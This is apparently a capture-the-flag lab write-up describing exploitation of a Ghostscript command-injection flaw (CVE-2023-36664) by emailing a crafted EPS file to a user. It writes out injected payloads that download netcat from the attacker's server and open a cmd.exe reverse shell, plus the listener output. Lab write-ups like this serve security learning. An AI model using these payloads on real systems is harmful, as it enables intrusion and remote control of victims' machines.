The round cube web server was found to be vulnerable to CVE-2023-36664 using this POC:
https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

I was able to gain a reverse shell into the windows server 

![[Pasted image 20240407202001.png]]

The following code was injected into the file.eps

1. The netcat binary was downloaded to the target using the following command: 
```bash
python3 CVE_2023_36664_exploit.py --inject --payload "curl http://10.10.14.28:8000/nc64.exe --output nc64.exe" --filename file.eps

```
This file was then sent to dr browns email address
2. A python simple server was setup so that the file could be download
```shell
python3 -m http.server 8000                                                                                                       
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.241 - - [07/Apr/2024 15:13:53] "GET /nc64.exe HTTP/1.1" 200 -
```
3. After the file was downloaded the file.eps was injected with the following payload inorder to obtain a reverse shell
```shell
python3 CVE_2023_36664_exploit.py --inject --payload "nc64.exe 10.10.14.28 7001 -e cmd.exe" --filename file.eps                   
[+] Payload successfully injected into file.eps.

```
This file was sent to the same email address as above and a netcat listener was setup to catch the reverse shell
4. The netcat listener catching the reverse shell
```shell
nc -lvnp 7001
listening on [any] 7001 ...
connect to [10.10.14.28] from (UNKNOWN) [10.10.11.241] 6330
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>l
```